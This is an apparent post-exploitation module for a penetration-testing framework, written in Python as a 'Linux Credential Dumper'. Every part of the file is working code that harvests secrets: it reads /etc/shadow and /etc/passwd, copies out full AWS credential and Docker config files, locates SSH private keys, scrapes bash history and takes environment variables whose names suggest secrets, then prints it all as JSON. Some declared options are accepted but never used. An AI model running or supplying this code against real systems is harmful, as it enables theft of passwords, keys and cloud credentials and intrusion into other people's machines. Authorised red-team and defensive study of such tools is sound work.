#!/usr/bin/env python3
"""
Linux Credential Dumper
=======================

Post-exploitation module for extracting credentials from Linux systems.
Extracts passwords, hashes, SSH keys, and other sensitive information.

Author: Brainless Security Team
Module: post/linux/credential_dump
Type: post
Rank: excellent
"""

import os
import sys
import re
import json
import subprocess
import pwd
import grp
from pathlib import Path

# Add framework path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

NAME = "Linux Credential Dumper"
DESCRIPTION = "Extracts credentials, hashes, and sensitive information from Linux systems"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "post"

class CredentialDumper(LoggerMixin):
    """
    Extracts credentials and sensitive information from Linux systems
    """
    
    def __init__(self):
        super().__init__('CredentialDumper')
        self.target_path = "/"
        self.include_memory = False
        self.include_network = False
        self.results = {}
        
        # Sensitive file patterns
        self.sensitive_files = [
            "/etc/passwd",
            "/etc/shadow", 
            "/etc/group",
            "/etc/sudoers",
            "/etc/ssh/sshd_config",
            "~/.ssh/id_rsa",
            "~/.ssh/id_dsa",
            "~/.ssh/id_ecdsa",
            "~/.ssh/id_ed25519",
            "~/.gnupg/secring.gpg",
            "~/.gnupg/private-keys-v1.d/",
            "~/.aws/credentials",
            "~/.aws/config",
            "~/.docker/config.json",
            "~/.subversion/auth/",
            "~/.netrc",
            "~/.rhosts",
            "~/.shosts",
            "/etc/hosts.equiv",
            "/etc/ssh/ssh_host_rsa_key",
            "/etc/ssh/ssh_host_dsa_key",
            "/etc/ssh/ssh_host_ecdsa_key",
            "/etc/ssh/ssh_host_ed25519_key"
        ]
    
    def set_option(self, option: str, value: str):
        """Set module options"""
        if option.lower() == 'target_path':
            self.target_path = value
        elif option.lower() == 'include_memory':
            self.include_memory = value.lower() == 'true'
        elif option.lower() == 'include_network':
            self.include_network = value.lower() == 'true'
    
    def get_options(self) -> dict:
        """Get module options"""
        return {
            'TARGET_PATH': {'description': 'Target directory to search (default: /)', 'required': False, 'default': '/'},
            'INCLUDE_MEMORY': {'description': 'Include memory analysis', 'required': False, 'default': 'false'},
            'INCLUDE_NETWORK': {'description': 'Include network credential analysis', 'required': False, 'default': 'false'}
        }
    
    def extract_passwd_entries(self) -> list:
        """
        Extract entries from /etc/passwd
        """
        passwd_entries = []
        
        try:
            with open('/etc/passwd', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(':')
                        if len(parts) >= 7:
                            entry = {
                                'username': parts[0],
                                'password': parts[1],
                                'uid': parts[2],
                                'gid': parts[3],
                                'gecos': parts[4],
                                'home': parts[5],
                                'shell': parts[6]
                            }
                            passwd_entries.append(entry)
        
        except Exception as e:
            self.error(f"Failed to read /etc/passwd: {e}")
        
        return passwd_entries
    
    def extract_shadow_entries(self) -> list:
        """
        Extract entries from /etc/shadow (requires root)
        """
        shadow_entries = []
        
        try:
            with open('/etc/shadow', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            entry = {
                                'username': parts[0],
                                'password_hash': parts[1],
                                'last_change': parts[2] if len(parts) > 2 else None,
                                'min_days': parts[3] if len(parts) > 3 else None,
                                'max_days': parts[4] if len(parts) > 4 else None,
                                'warn_days': parts[5] if len(parts) > 5 else None,
                                'inactive_days': parts[6] if len(parts) > 6 else None,
                                'expire_date': parts[7] if len(parts) > 7 else None
                            }
                            shadow_entries.append(entry)
        
        except PermissionError:
            self.warning("Cannot read /etc/shadow (requires root privileges)")
        except Exception as e:
            self.error(f"Failed to read /etc/shadow: {e}")
        
        return shadow_entries
    
    def extract_group_entries(self) -> list:
        """
        Extract entries from /etc/group
        """
        group_entries = []
        
        try:
            with open('/etc/group', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(':')
                        if len(parts) >= 4:
                            entry = {
                                'groupname': parts[0],
                                'password': parts[1],
                                'gid': parts[2],
                                'members': parts[3].split(',') if parts[3] else []
                            }
                            group_entries.append(entry)
        
        except Exception as e:
            self.error(f"Failed to read /etc/group: {e}")
        
        return group_entries
    
    def extract_sudoers(self) -> str:
        """
        Extract sudoers configuration
        """
        sudoers_content = ""
        
        try:
            with open('/etc/sudoers', 'r') as f:
                sudoers_content = f.read()
        
        except Exception as e:
            self.error(f"Failed to read /etc/sudoers: {e}")
        
        return sudoers_content
    
    def find_ssh_keys(self) -> list:
        """
        Find SSH private keys on the system
        """
        ssh_keys = []
        
        # Common locations to search
        search_paths = [
            '/root/.ssh/',
            '/home/*/.ssh/',
            '/etc/ssh/'
        ]
        
        for path in search_paths:
            try:
                if '*' in path:
                    # Handle glob patterns
                    import glob
                    paths = glob.glob(path)
                else:
                    paths = [path]
                
                for actual_path in paths:
                    if os.path.isdir(actual_path):
                        for file in os.listdir(actual_path):
                            if file.startswith('id_') and not file.endswith('.pub'):
                                key_path = os.path.join(actual_path, file)
                                ssh_keys.append({
                                    'path': key_path,
                                    'size': os.path.getsize(key_path),
                                    'modified': os.path.getmtime(key_path)
                                })
            
            except Exception as e:
                self.debug(f"Error searching {path}: {e}")
        
        return ssh_keys
    
    def find_aws_credentials(self) -> list:
        """
        Find AWS credentials
        """
        aws_creds = []
        
        # Common AWS credential locations
        cred_paths = [
            '~/.aws/credentials',
            '~/.aws/config',
            '/etc/aws/credentials'
        ]
        
        for path in cred_paths:
            try:
                expanded_path = os.path.expanduser(path)
                if os.path.exists(expanded_path):
                    with open(expanded_path, 'r') as f:
                        content = f.read()
                        aws_creds.append({
                            'path': expanded_path,
                            'content': content
                        })
            except Exception as e:
                self.debug(f"Error reading {path}: {e}")
        
        return aws_creds
    
    def find_docker_configs(self) -> list:
        """
        Find Docker configuration files
        """
        docker_configs = []
        
        config_paths = [
            '~/.docker/config.json',
            '/etc/docker/daemon.json'
        ]
        
        for path in config_paths:
            try:
                expanded_path = os.path.expanduser(path)
                if os.path.exists(expanded_path):
                    with open(expanded_path, 'r') as f:
                        content = f.read()
                        docker_configs.append({
                            'path': expanded_path,
                            'content': content
                        })
            except Exception as e:
                self.debug(f"Error reading {path}: {e}")
        
        return docker_configs
    
    def extract_bash_history(self) -> list:
        """
        Extract commands from bash history
        """
        history_commands = []
        
        # Try different user home directories
        try:
            # Get list of users
            users = pwd.getpwall()
            
            for user in users:
                if user.pw_uid >= 1000 or user.pw_name in ['root', 'ubuntu', 'debian']:
                    history_path = os.path.join(user.pw_dir, '.bash_history')
                    
                    try:
                        if os.path.exists(history_path):
                            with open(history_path, 'r') as f:
                                for line in f:
                                    line = line.strip()
                                    if line and not line.startswith('#'):
                                        history_commands.append({
                                            'user': user.pw_name,
                                            'command': line,
                                            'file': history_path
                                        })
                    except Exception as e:
                        self.debug(f"Error reading history for {user.pw_name}: {e}")
        
        except Exception as e:
            self.error(f"Failed to extract bash history: {e}")
        
        return history_commands
    
    def extract_environment_variables(self) -> dict:
        """
        Extract environment variables that might contain credentials
        """
        sensitive_vars = {}
        
        # Sensitive environment variable patterns
        sensitive_patterns = [
            'PASSWORD', 'PASSWD', 'SECRET', 'KEY', 'TOKEN', 'AUTH',
            'AWS_', 'DOCKER_', 'SSH_', 'PG_', 'MYSQL_', 'REDIS_'
        ]
        
        for key, value in os.environ.items():
            for pattern in sensitive_patterns:
                if pattern in key.upper():
                    sensitive_vars[key] = value
                    break
        
        return sensitive_vars
    
    def extract_network_connections(self) -> list:
        """
        Extract network connections (requires root for full details)
        """
        connections = []
        
        try:
            # Use ss command to get connections
            result = subprocess.run(['ss', '-tuln'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'LISTEN' in line or 'ESTAB' in line:
                    connections.append(line.strip())
        
        except Exception as e:
            self.error(f"Failed to extract network connections: {e}")
        
        return connections
    
    def extract_running_processes(self) -> list:
        """
        Extract running processes that might contain sensitive information
        """
        processes = []
        
        try:
            # Use ps command to get process information
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if line.strip():
                    processes.append(line.strip())
        
        except Exception as e:
            self.error(f"Failed to extract running processes: {e}")
        
        return processes
    
    def run(self) -> dict:
        """
        Main module execution
        """
        try:
            self.info("Starting credential extraction...")
            
            # Extract various credential types
            self.results = {
                'system_info': {
                    'hostname': os.uname().nodename,
                    'platform': os.uname().sysname,
                    'release': os.uname().release,
                    'architecture': os.uname().machine,
                    'timestamp': os.times()[4]
                },
                'passwd_entries': self.extract_passwd_entries(),
                'shadow_entries': self.extract_shadow_entries(),
                'group_entries': self.extract_group_entries(),
                'sudoers': self.extract_sudoers(),
                'ssh_keys': self.find_ssh_keys(),
                'aws_credentials': self.find_aws_credentials(),
                'docker_configs': self.find_docker_configs(),
                'bash_history': self.extract_bash_history(),
                'environment_variables': self.extract_environment_variables()
            }
            
            # Include additional analysis if requested
            if self.include_network:
                self.results['network_connections'] = self.extract_network_connections()
                self.results['running_processes'] = self.extract_running_processes()
            
            # Generate summary
            summary = {
                'total_users': len(self.results['passwd_entries']),
                'users_with_shell': len([u for u in self.results['passwd_entries'] if u['shell'] not in ['/bin/false', '/sbin/nologin']]),
                'shadow_readable': len(self.results['shadow_entries']) > 0,
                'ssh_keys_found': len(self.results['ssh_keys']),
                'aws_configs_found': len(self.results['aws_credentials']),
                'docker_configs_found': len(self.results['docker_configs']),
                'history_commands': len(self.results['bash_history']),
                'sensitive_env_vars': len(self.results['environment_variables'])
            }
            
            self.info(f"Extraction completed. Found {summary['total_users']} users, {summary['ssh_keys_found']} SSH keys")
            
            return {
                'success': True,
                'summary': summary,
                'results': self.results
            }
            
        except Exception as e:
            self.error(f"Credential extraction failed: {e}")
            return {'success': False, 'message': f'Extraction failed: {str(e)}'}


def run(options: dict = None) -> dict:
    """
    Entry point for the module
    """
    dumper = CredentialDumper()
    
    # Set options if provided
    if options:
        for key, value in options.items():
            dumper.set_option(key, value)
    
    return dumper.run()


if __name__ == '__main__':
    # Example usage
    options = {
        'TARGET_PATH': '/',
        'INCLUDE_MEMORY': 'false',
        'INCLUDE_NETWORK': 'true'
    }
    
    result = run(options)
    print(json.dumps(result, indent=2))